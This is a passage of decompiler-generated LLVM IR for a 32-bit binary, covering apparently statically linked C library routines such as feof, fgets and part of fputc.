  %v0_80517a7 = phi i32 [ %v2_805179d, %dec_label_pc_805177f ], [ %v3_8051748, %dec_label_pc_80517a1 ]
  store i32 %v0_80517a7, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_80517af = inttoptr i32 %v0_80517af to i8*
  %v2_80517af = load i8, i8* %v1_80517af, align 1
  %v3_80517af = sext i8 %v2_80517af to i32
  store i32 %v3_80517af, i32* %eax.global-to-local, align 4
  %v2_80517b2 = add i32 %tmp76, 4
  %v3_80517b2 = inttoptr i32 %v2_80517b2 to i32*
  store i32 %v0_80517b2, i32* %v3_80517b2, align 4
  %v0_80517b5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80517b5 = load i32, i32* @edx, align 4
  %v2_80517b5 = add i32 %v1_80517b5, 12
  %v3_80517b5 = inttoptr i32 %v2_80517b5 to i32*
  store i32 %v0_80517b5, i32* %v3_80517b5, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_80517bc = load i32, i32* @edx, align 4
  %v1_80517bc = add i32 %v0_80517bc, 28
  %v2_80517bc = inttoptr i32 %v1_80517bc to i32*
  store i32 1, i32* %v2_80517bc, align 4
  %v0_80517c3 = load i32, i32* %eax.global-to-local, align 4
  %v1_80517c3 = load i32, i32* @edx, align 4
  %v2_80517c3 = add i32 %v1_80517c3, 8
  %v3_80517c3 = inttoptr i32 %v2_80517c3 to i32*
  store i32 %v0_80517c3, i32* %v3_80517c3, align 4
  %v0_80517c6 = load i32, i32* %edi.global-to-local, align 4
  %v1_80517d0 = and i32 %v0_80517c6, -5
  %v0_80517d6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80517d6 = and i32 %v0_80517d6, 3840
  store i32 %v1_80517d6, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_80517df = or i32 %v1_80517d6, %v1_80517d0
  store i32 %v2_80517df, i32* @edi, align 4
  %v1_80517e1 = load i32, i32* @edx, align 4
  %v2_80517e1 = add i32 %v1_80517e1, 20
  %v3_80517e1 = inttoptr i32 %v2_80517e1 to i32*
  store i32 48, i32* %v3_80517e1, align 4
  %v0_80517e4 = load i32, i32* @edi, align 4
  %v1_80517e4 = load i32, i32* @edx, align 4
  %v2_80517e4 = add i32 %v1_80517e4, 16
  %v3_80517e4 = inttoptr i32 %v2_80517e4 to i32*
  store i32 %v0_80517e4, i32* %v3_80517e4, align 4
  %v0_80517e7 = load i32, i32* @ecx, align 4
  %v1_80517e7 = inttoptr i32 %v0_80517e7 to i8*
  %v2_80517e7 = load i8, i8* %v1_80517e7, align 1
  %v3_80517e7 = icmp eq i8 %v2_80517e7, 0
  %v1_80517ea = icmp eq i1 %v3_80517e7, false
  br i1 %v1_80517ea, label %dec_label_pc_8051803, label %dec_label_pc_80517ec

dec_label_pc_80517ec:                             ; preds = %dec_label_pc_80517a7
  %v0_80517ec = load i32, i32* @esi, align 4
  %v1_80517ec = inttoptr i32 %v0_80517ec to i8*
  %v2_80517ec = load i8, i8* %v1_80517ec, align 1
  %v11_80517ec = icmp eq i8 %v2_80517ec, 109
  %v1_80517ef = icmp eq i1 %v11_80517ec, false
  br i1 %v1_80517ef, label %dec_label_pc_80518fd, label %dec_label_pc_80517f5

dec_label_pc_80517f5:                             ; preds = %dec_label_pc_80517ec
  %v0_80517f5 = load i32, i32* @edx, align 4
  %v1_80517f5 = add i32 %v0_80517f5, 32
  %v2_80517f5 = inttoptr i32 %v1_80517f5 to i32*
  store i32 20, i32* %v2_80517f5, align 4
  %v0_80517fc = load i32, i32* @edx, align 4
  %v1_80517fc = add i32 %v0_80517fc, 28
  %v2_80517fc = inttoptr i32 %v1_80517fc to i32*
  store i32 0, i32* %v2_80517fc, align 4
  br label %dec_label_pc_8051803

dec_label_pc_8051803:                             ; preds = %dec_label_pc_80517a7, %dec_label_pc_80517f5
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_805189f, label %dec_label_pc_805180e

dec_label_pc_805180e:                             ; preds = %dec_label_pc_8051803
  store i32 0, i32* %ebp.global-to-local, align 4
  %v4_8051887 = add i32 %tmp76, 40
  %v4_805181d = add i32 %tmp76, 36
  %v1_8051890 = add i32 %tmp76, 28
  %v2_8051890 = inttoptr i32 %v1_8051890 to i32*
  br label %dec_label_pc_8051810

dec_label_pc_8051810:                             ; preds = %dec_label_pc_805188b, %dec_label_pc_805180e
  %v0_8051826 = phi i32 [ 0, %dec_label_pc_805180e ], [ %v1_805188f, %dec_label_pc_805188b ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_805180e ], [ %stack_var_-88.5, %dec_label_pc_805188b ]
  %v1_8051810 = add i32 %v0_8051826, -2
  %v6_8051810 = sub i32 1, %v0_8051826
  %v7_8051810 = and i32 %v6_8051810, %v0_8051826
  %v8_8051810 = icmp slt i32 %v7_8051810, 0
  %v9_8051810 = icmp eq i32 %v1_8051810, 0
  %v10_8051810 = icmp slt i32 %v1_8051810, 0
  %v3_8051813 = icmp eq i1 %v10_8051810, %v8_8051810
  %v4_8051813 = icmp eq i1 %v9_8051810, false
  %v5_8051813 = and i1 %v4_8051813, %v3_8051813
  br i1 %v5_8051813, label %dec_label_pc_8051826, label %dec_label_pc_8051815

dec_label_pc_8051815:                             ; preds = %dec_label_pc_8051810
  %v0_8051815 = load i32, i32* @esp, align 4
  %v2_8051815 = mul i32 %v0_8051826, 4
  %v3_8051815 = add i32 %v2_8051815, 68
  %v4_8051815 = add i32 %v3_8051815, %v0_8051815
  %v5_8051815 = inttoptr i32 %v4_8051815 to i32*
  %v6_8051815 = load i32, i32* %v5_8051815, align 4
  store i32 %v6_8051815, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_805181d = trunc i32 %v6_8051815 to i8
  %v5_805181d = add i32 %v4_805181d, %v0_8051826
  %v6_805181d = inttoptr i32 %v5_805181d to i8*
  store i8 %v1_805181d, i8* %v6_805181d, align 1
  %v0_8051821 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051821 = urem i32 %v0_8051821, 256
  br label %dec_label_pc_805182f

dec_label_pc_8051826:                             ; preds = %dec_label_pc_8051810
  %v5_8051828 = add i32 %v0_8051826, %stack_var_-32.3
  store i32 %v5_8051828, i32* %eax.global-to-local, align 4
  %v1_805182c = add i32 %v5_8051828, -2
  br label %dec_label_pc_805182f

dec_label_pc_805182f:                             ; preds = %dec_label_pc_8051815, %dec_label_pc_8051826
  %v0_8051842 = phi i32 [ %v1_8051821, %dec_label_pc_8051815 ], [ %v1_805182c, %dec_label_pc_8051826 ]
  store i32 %v0_8051842, i32* %eax.global-to-local, align 4
  %v5_805182f = sub i32 %v0_8051842, %stack_var_-88.4
  %v11_805182f = xor i32 %v0_8051842, %stack_var_-88.4
  %v12_805182f = xor i32 %v5_805182f, %v0_8051842
  %v13_805182f = and i32 %v12_805182f, %v11_805182f
  %v14_805182f = icmp slt i32 %v13_805182f, 0
  %v15_805182f = icmp eq i32 %v5_805182f, 0
  %v16_805182f = icmp slt i32 %v5_805182f, 0
  %v3_8051833 = icmp ne i1 %v16_805182f, %v14_805182f
  %v4_8051833 = or i1 %v15_805182f, %v3_8051833
  br i1 %v4_8051833, label %dec_label_pc_8051842, label %dec_label_pc_8051835

dec_label_pc_8051835:                             ; preds = %dec_label_pc_805182f
  %v1_8051835 = add i32 %v0_8051842, -9
  %v6_8051835 = sub i32 8, %v0_8051842
  %v7_8051835 = and i32 %v6_8051835, %v0_8051842
  %v8_8051835 = icmp slt i32 %v7_8051835, 0
  %v9_8051835 = icmp eq i32 %v1_8051835, 0
  %v10_8051835 = icmp slt i32 %v1_8051835, 0
  %v3_8051838 = icmp eq i1 %v10_8051835, %v8_8051835
  %v4_8051838 = icmp eq i1 %v9_8051835, false
  %v5_8051838 = and i1 %v4_8051838, %v3_8051838
  br i1 %v5_8051838, label %dec_label_pc_80518fd, label %dec_label_pc_8051842

dec_label_pc_8051842:                             ; preds = %dec_label_pc_8051835, %dec_label_pc_805182f
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_805182f ], [ %v0_8051842, %dec_label_pc_8051835 ]
  %v1_8051842 = add i32 %v0_8051842, -1
  store i32 %v1_8051842, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_805184b = load i32, i32* @esp, align 4
  %v1_805184b = load i32, i32* %ebp.global-to-local, align 4
  %v2_805184b = mul i32 %v1_805184b, 4
  %v3_805184b = add i32 %v0_805184b, 80
  %v4_805184b = add i32 %v3_805184b, %v2_805184b
  %v5_805184b = inttoptr i32 %v4_805184b to i32*
  %v6_805184b = load i32, i32* %v5_805184b, align 4
  store i32 %v6_805184b, i32* %edi.global-to-local, align 4
  %v2_805184f = mul i32 %v1_8051842, 4
  %v4_805184f = add i32 %v4_8051887, %v2_805184f
  %v5_805184f = inttoptr i32 %v4_805184f to i32*
  %v6_805184f = load i32, i32* %v5_805184f, align 4
  store i32 %v6_805184f, i32* @eax, align 4
  %v9_8051853 = icmp eq i32 %v6_805184b, 8
  br i1 %v9_8051853, label %dec_label_pc_805188b, label %dec_label_pc_8051858

dec_label_pc_8051858:                             ; preds = %dec_label_pc_8051842
  %v9_8051858 = icmp eq i32 %v6_805184f, 8
  br i1 %v9_8051858, label %dec_label_pc_805187b, label %dec_label_pc_805185d

dec_label_pc_805185d:                             ; preds = %dec_label_pc_8051858
  %v12_805185d = icmp eq i32 %v6_805184f, %v6_805184b
  br i1 %v12_805185d, label %dec_label_pc_805187b, label %dec_label_pc_8051861

dec_label_pc_8051861:                             ; preds = %dec_label_pc_805185d
  %v1_8051861 = call i32 @_promoted_size(i32 %v1_8051842)
  store i32 %v1_8051861, i32* %ebx.global-to-local, align 4
  %v0_8051868 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_8051868, i32* @eax, align 4
  %v1_805186a = call i32 @_promoted_size(i32 %v1_8051842)
  %v2_805186f = sub i32 %v1_8051861, %v1_805186a
  %v8_805186f = xor i32 %v1_8051861, %v1_805186a
  %v9_805186f = xor i32 %v2_805186f, %v1_8051861
  %v10_805186f = and i32 %v9_805186f, %v8_805186f
  %v11_805186f = icmp slt i32 %v10_805186f, 0
  %v12_805186f = icmp eq i32 %v2_805186f, 0
  %v13_805186f = icmp slt i32 %v2_805186f, 0
  %v3_8051871 = icmp ne i1 %v13_805186f, %v11_805186f
  %v4_8051871 = or i1 %v12_805186f, %v3_8051871
  %v5_8051871 = zext i1 %v4_8051871 to i32
  store i32 %v5_8051871, i32* %eax.global-to-local, align 4
  %v1_8051877 = icmp eq i1 %v4_8051871, false
  br i1 %v1_8051877, label %dec_label_pc_805188b, label %dec_label_pc_8051861.dec_label_pc_805187b_crit_edge

dec_label_pc_8051861.dec_label_pc_805187b_crit_edge: ; preds = %dec_label_pc_8051861
  %v0_805187b.pre = load i32, i32* @esp, align 4
  %v1_805187b.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805187b

dec_label_pc_805187b:                             ; preds = %dec_label_pc_8051861.dec_label_pc_805187b_crit_edge, %dec_label_pc_805185d, %dec_label_pc_8051858
  %v1_805187b = phi i32 [ %v1_805187b.pre, %dec_label_pc_8051861.dec_label_pc_805187b_crit_edge ], [ %v1_805184b, %dec_label_pc_805185d ], [ %v1_805184b, %dec_label_pc_8051858 ]
  %v0_805187b = phi i32 [ %v0_805187b.pre, %dec_label_pc_8051861.dec_label_pc_805187b_crit_edge ], [ %v0_805184b, %dec_label_pc_805185d ], [ %v0_805184b, %dec_label_pc_8051858 ]
  %v2_805187b = mul i32 %v1_805187b, 4
  %v3_805187b = add i32 %v0_805187b, 80
  %v4_805187b = add i32 %v3_805187b, %v2_805187b
  %v5_805187b = inttoptr i32 %v4_805187b to i32*
  %v6_805187b = load i32, i32* %v5_805187b, align 4
  store i32 %v6_805187b, i32* %eax.global-to-local, align 4
  store i32 %v1_8051842, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  store i32 %v6_805187b, i32* %v5_805184f, align 4
  br label %dec_label_pc_805188b

dec_label_pc_805188b:                             ; preds = %dec_label_pc_8051861, %dec_label_pc_8051842, %dec_label_pc_805187b
  store i32 %tmp76, i32* @ecx, align 4
  %v0_805188f = load i32, i32* %ebp.global-to-local, align 4
  %v1_805188f = add i32 %v0_805188f, 1
  store i32 %v1_805188f, i32* %ebp.global-to-local, align 4
  %v3_8051890 = load i32, i32* %v2_8051890, align 4
  %v1_8051893 = add i32 %v3_8051890, 2
  store i32 %v1_8051893, i32* %eax.global-to-local, align 4
  %v5_8051898 = icmp slt i32 %v1_805188f, %v1_8051893
  br i1 %v5_8051898, label %dec_label_pc_8051810, label %dec_label_pc_80518c6

dec_label_pc_805189f:                             ; preds = %dec_label_pc_8051803
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_80518a3 = add i32 %tmp76, 38
  %v2_80518a3 = inttoptr i32 %v1_80518a3 to i8*
  store i8 1, i8* %v2_80518a3, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_80518ac = add i32 %tmp76, 28
  %v2_80518ac = inttoptr i32 %v1_80518ac to i32*
  %v3_80518ac = load i32, i32* %v2_80518ac, align 4
  %v2_80518af = mul i32 %v3_80518ac, 4
  %v2_80518b3 = ptrtoint i32* %stack_var_-20 to i32
  %v1_80518ba = add i32 %tmp76, 40
  store i32 %v1_80518ba, i32* %eax.global-to-local, align 4
  %v3_80518be = inttoptr i32 %v1_80518ba to i16*
  %v4_80518be = call i32 @memcpy(i16* %v3_80518be, i32 %v2_80518b3, i32 %v2_80518af)
  store i32 %v4_80518be, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80518c6

dec_label_pc_80518c6:                             ; preds = %dec_label_pc_805188b, %dec_label_pc_805189f
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_805189f ], [ %stack_var_-88.5, %dec_label_pc_805188b ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  %v2_80518ce = inttoptr i32 %v1_805156f to i8*
  %v3_80518ce = load i8, i8* %v2_80518ce, align 1
  %v5_80518ce = icmp slt i8 %v3_80518ce, 0
  store i32 %stack_var_-88.6, i32* %v2_8051568, align 4
  br i1 %v5_80518ce, label %dec_label_pc_80518de, label %dec_label_pc_80518d7

dec_label_pc_80518d7:                             ; preds = %dec_label_pc_80518c6
  %v0_80518d7 = load i32, i32* @esi, align 4
  %v1_80518d7 = add i32 %v0_80518d7, 1
  store i32 %v1_80518d7, i32* %eax.global-to-local, align 4
  %v1_80518da = load i32, i32* @ecx, align 4
  %v2_80518da = inttoptr i32 %v1_80518da to i32*
  store i32 %v1_80518d7, i32* %v2_80518da, align 4
  br label %dec_label_pc_80518f1

dec_label_pc_80518de:                             ; preds = %dec_label_pc_80518c6
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %v4_805153c, i32* %edx.global-to-local, align 4
  %v0_80518e6 = load i32, i32* @esi, align 4
  %v2_80518e6 = sub i32 %v0_80518e6, %v4_805153c
  store i32 %v2_80518e6, i32* %esi.global-to-local, align 4
  %v1_80518e8 = mul i32 %v2_80518e6, 4
  %v2_80518e8 = add i32 %v1_80518e8, 224
  store i32 %v2_80518e8, i32* %eax.global-to-local, align 4
  %v2_80518ef = load i32, i32* %arg1, align 4
  %v4_80518ef = add i32 %v2_80518ef, %v2_80518e8
  store i32 %v4_80518ef, i32* %arg1, align 4
  br label %dec_label_pc_80518f1

dec_label_pc_80518f1:                             ; preds = %dec_label_pc_80518d7, %dec_label_pc_80518de
  store i32 %tmp76, i32* @edx, align 4
  %v1_80518f5 = add i32 %tmp76, 28
  %v2_80518f5 = inttoptr i32 %v1_80518f5 to i32*
  %v3_80518f5 = load i32, i32* %v2_80518f5, align 4
  store i32 %v3_80518f5, i32* %eax.global-to-local, align 4
  %v1_80518f8 = add i32 %v3_80518f5, 2
  br label %dec_label_pc_8051900

dec_label_pc_80518fd:                             ; preds = %dec_label_pc_805158d, %dec_label_pc_8051627, %dec_label_pc_805165a, %dec_label_pc_80516d5, %dec_label_pc_80516c1, %dec_label_pc_80516b8, %dec_label_pc_8051835, %dec_label_pc_80517ec, %dec_label_pc_8051737
  br label %dec_label_pc_8051900

dec_label_pc_8051900:                             ; preds = %dec_label_pc_80518f1, %dec_label_pc_80518fd
  %storemerge6 = phi i32 [ %v1_80518f8, %dec_label_pc_80518f1 ], [ -1, %dec_label_pc_80518fd ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_8051903 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8051903, i32* @ebx, align 4
  store i32 %v0_805153b, i32* @esi, align 4
  store i32 %v0_805153a, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %v1_805188f, { 0, 2, 1 }
  uselistorder i32 %v2_805186f, { 1, 2, 0 }
  uselistorder i32 %v1_8051861, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8051842, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_8051835, { 1, 0 }
  uselistorder i32 %v5_805182f, { 1, 2, 0 }
  uselistorder i32 %v0_8051842, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_8051810, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_8051826, { 0, 2, 3, 1, 5, 4 }
  uselistorder i32 %v1_80517a1, { 1, 2, 0 }
  uselistorder i32 %v1_8051777, { 1, 2, 0 }
  uselistorder i32 %v0_80517a1, { 2, 0, 1, 3 }
  uselistorder i32 %v2_805173d, { 1, 0 }
  uselistorder i32 %v1_805172a, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_8051733, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_805171d, { 0, 2, 3, 1 }
  uselistorder i32 %v6_8051713, { 1, 0 }
  uselistorder i32 %v1_80516f5, { 1, 0 }
  uselistorder i32 %v0_8051713.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_80516d8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_80516cf, { 1, 2, 0 }
  uselistorder i32 %v0_8051695, { 1, 0 }
  uselistorder i32 %v1_8051687, { 1, 0 }
  uselistorder i32 %v1_8051682, { 0, 1, 3, 2 }
  uselistorder i32 %v6_8051680, { 2, 0, 1 }
  uselistorder i32 %v0_80516a2, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_805163d, { 1, 2, 0 }
  uselistorder i32 %v0_8051615, { 1, 2, 3, 6, 0, 4, 5, 7 }
  uselistorder i32 %v2_805160b, { 1, 2, 0 }
  uselistorder i32 %v6_8051609, { 0, 2, 1 }
  uselistorder i32 %v0_8051608, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v1_8051601, { 1, 2, 3, 9, 7, 4, 5, 8, 6, 11, 12, 10, 0, 13 }
  uselistorder i32 %v3_8051601, { 2, 1, 0 }
  uselistorder i32 %v1_80515f9, { 1, 0 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v8_80515df, { 1, 0, 3, 2 }
  uselistorder i32 %v1_80515b5, { 0, 2, 1 }
  uselistorder i32 %v0_80515a2, { 2, 0, 1 }
  uselistorder i32 %v4_805153c, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 0, 20, 19, 18, 17, 16, 14, 13, 12, 1, 3, 15, 2, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 5, 4, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 35, 31, 30, 32, 33, 36, 34, 42, 37, 38, 39, 40, 41, 43, 44 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -9, { 2, 0, 3, 1 }
  uselistorder i32 3840, { 2, 3, 4, 0, 1 }
  uselistorder i32 -5, { 6, 2, 3, 4, 1, 5, 0 }
  uselistorder i32 -134592791, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_805b921.222 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_8051900, { 1, 0 }
  uselistorder label %dec_label_pc_80518fd, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_80518f1, { 1, 0 }
  uselistorder label %dec_label_pc_80518c6, { 1, 0 }
  uselistorder label %dec_label_pc_805188b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805182f, { 1, 0 }
  uselistorder label %dec_label_pc_8051803, { 1, 0 }
  uselistorder label %dec_label_pc_805176b, { 1, 0 }
  uselistorder label %dec_label_pc_8051737, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805170e, { 1, 0 }
  uselistorder label %dec_label_pc_80516e5, { 1, 0 }
  uselistorder label %dec_label_pc_80516ac, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_805164f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051609, { 1, 0 }
  uselistorder label %dec_label_pc_8051608, { 1, 0 }
  uselistorder label %dec_label_pc_80515ef, { 1, 0 }
  uselistorder label %dec_label_pc_80515d8, { 1, 0 }
  uselistorder label %dec_label_pc_80515d8.outer, { 2, 0, 1 }
}

define i32 @feof(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_8051908 = load i32, i32* @edi, align 4
  %v0_8051909 = load i32, i32* @esi, align 4
  %v0_805190a = load i32, i32* @ebx, align 4
  %v4_805190e = ptrtoint i16* %arg1 to i32
  store i32 %v4_805190e, i32* @esi, align 4
  %v1_8051912 = add i32 %v4_805190e, 52
  %v2_8051912 = inttoptr i32 %v1_8051912 to i32*
  %v3_8051912 = load i32, i32* %v2_8051912, align 4
  store i32 %v3_8051912, i32* @edi, align 4
  %v1_8051915 = icmp eq i32 %v3_8051912, 0
  %v1_8051917 = icmp eq i1 %v1_8051915, false
  br i1 %v1_8051917, label %dec_label_pc_8051938, label %dec_label_pc_8051919

dec_label_pc_8051919:                             ; preds = %entry
  %v1_8051919 = add i32 %v4_805190e, 56
  store i32 %v1_8051919, i32* @ebx, align 4
  %v4_8051928 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134541533, i32 %v1_8051919)
  %v0_805192d = load i32, i32* @ebx, align 4
  %v1_8051930 = call i32 @pthread_mutex_lock(i32 %v0_805192d)
  %v0_805193a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051938

dec_label_pc_8051938:                             ; preds = %entry, %dec_label_pc_8051919
  %v0_805193a = phi i32 [ %v4_805190e, %entry ], [ %v0_805193a.pre, %dec_label_pc_8051919 ]
  %v1_805193a = inttoptr i32 %v0_805193a to i16*
  %v2_805193a = load i16, i16* %v1_805193a, align 2
  %v3_805193a = zext i16 %v2_805193a to i32
  store i32 %v3_805193a, i32* @ebx, align 4
  br i1 %v1_8051917, label %dec_label_pc_8051950, label %dec_label_pc_805193f

dec_label_pc_805193f:                             ; preds = %dec_label_pc_8051938
  %v3_8051948 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  %v0_8051953.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051950

dec_label_pc_8051950:                             ; preds = %dec_label_pc_8051938, %dec_label_pc_805193f
  %v0_8051953 = phi i32 [ %v3_805193a, %dec_label_pc_8051938 ], [ %v0_8051953.pre, %dec_label_pc_805193f ]
  %v1_8051953 = and i32 %v0_8051953, 4
  store i32 %v0_805190a, i32* @ebx, align 4
  store i32 %v0_8051909, i32* @esi, align 4
  store i32 %v0_8051908, i32* @edi, align 4
  ret i32 %v1_8051953

; uselistorder directives
  uselistorder label %dec_label_pc_8051950, { 1, 0 }
  uselistorder label %dec_label_pc_8051938, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_805195c = load i32, i32* @edi, align 4
  %v0_805195d = load i32, i32* @esi, align 4
  %v0_805195e = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8051966 = add i32 %arg3, 52
  %v2_8051966 = inttoptr i32 %v1_8051966 to i32*
  %v3_8051966 = load i32, i32* %v2_8051966, align 4
  store i32 %v3_8051966, i32* @edi, align 4
  %v1_8051969 = icmp eq i32 %v3_8051966, 0
  %v1_805196b = icmp eq i1 %v1_8051969, false
  br i1 %v1_805196b, label %entry.dec_label_pc_805198c_crit_edge, label %dec_label_pc_805196d

entry.dec_label_pc_805198c_crit_edge:             ; preds = %entry
  br label %dec_label_pc_805198c

dec_label_pc_805196d:                             ; preds = %entry
  %v1_805196d = add i32 %arg3, 56
  store i32 %v1_805196d, i32* @ebx, align 4
  %v4_805197c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134541533, i32 %v1_805196d)
  %v0_8051981 = load i32, i32* @ebx, align 4
  %v1_8051984 = call i32 @pthread_mutex_lock(i32 %v0_8051981)
  %v0_805198d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805198c

dec_label_pc_805198c:                             ; preds = %entry.dec_label_pc_805198c_crit_edge, %dec_label_pc_805196d
  %v0_805198d = phi i32 [ %arg3, %entry.dec_label_pc_805198c_crit_edge ], [ %v0_805198d.pre, %dec_label_pc_805196d ]
  %v0_805198c = load i32, i32* @edx, align 4
  %v4_8051996 = inttoptr i32 %arg1 to i8*
  %v5_8051996 = call i32 @__GI_fgets_unlocked(i8* %v4_8051996, i32 %arg2, i32 %v0_805198d, i32 %v0_805198c)
  store i32 %v5_8051996, i32* @ebx, align 4
  br i1 %v1_805196b, label %dec_label_pc_80519b5, label %dec_label_pc_80519a4

dec_label_pc_80519a4:                             ; preds = %dec_label_pc_805198c
  %v3_80519ad = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  %v0_80519b8.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80519b5

dec_label_pc_80519b5:                             ; preds = %dec_label_pc_805198c, %dec_label_pc_80519a4
  %v0_80519b8 = phi i32 [ %v5_8051996, %dec_label_pc_805198c ], [ %v0_80519b8.pre, %dec_label_pc_80519a4 ]
  store i32 %v0_805195e, i32* @ebx, align 4
  store i32 %v0_805195d, i32* @esi, align 4
  store i32 %v0_805195c, i32* @edi, align 4
  ret i32 %v0_80519b8

; uselistorder directives
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80519b5, { 1, 0 }
  uselistorder label %dec_label_pc_805198c, { 1, 0 }
}

define i32 @__GI_fputc(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_80519c0 = load i32, i32* @edi, align 4
  %v0_80519c1 = load i32, i32* @esi, align 4
  %v0_80519c2 = load i32, i32* @ebx, align 4
  %v12_80519c3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg2, i32* @esi, align 4
  %v4_80519ca = sext i8 %arg1 to i32
  store i32 %v4_80519ca, i32* @edi, align 4
  %v1_80519ce = add i32 %arg2, 52
  %v2_80519ce = inttoptr i32 %v1_80519ce to i32*
  %v3_80519ce = load i32, i32* %v2_80519ce, align 4
  %v4_80519ce = icmp eq i32 %v3_80519ce, 0
  br i1 %v4_80519ce, label %dec_label_pc_80519f6, label %dec_label_pc_80519d4

dec_label_pc_80519d4:                             ; preds = %entry
  %v1_80519d4 = add i32 %arg2, 16
  %v2_80519d4 = inttoptr i32 %v1_80519d4 to i32*
  %v3_80519d4 = load i32, i32* %v2_80519d4, align 4
  store i32 %v3_80519d4, i32* %eax.global-to-local, align 4
  %v2_80519d7 = add i32 %arg2, 28
  %v3_80519d7 = inttoptr i32 %v2_80519d7 to i32*
  %v4_80519d7 = load i32, i32* %v3_80519d7, align 4
  %v10_80519d7 = icmp ult i32 %v3_80519d4, %v4_80519d7
  %v1_80519da = icmp eq i1 %v10_80519d7, false
  br i1 %v1_80519da, label %dec_label_pc_80519e9, label %dec_label_pc_80519dc

dec_label_pc_80519dc:                             ; preds = %dec_label_pc_80519d4
  store i32 %v4_80519ca, i32* %edx.global-to-local, align 4
  %v3_80519de = inttoptr i32 %v3_80519d4 to i8*
  store i8 %arg1, i8* %v3_80519de, align 1
  %v0_80519e0 = load i32, i32* %edx.global-to-local, align 4
  %v1_80519e0 = urem i32 %v0_80519e0, 256
  store i32 %v1_80519e0, i32* @ebx, align 4
  %v0_80519e3 = load i32, i32* %eax.global-to-local, align 4
  %v1_80519e3 = add i32 %v0_80519e3, 1
  store i32 %v1_80519e3, i32* %eax.global-to-local, align 4
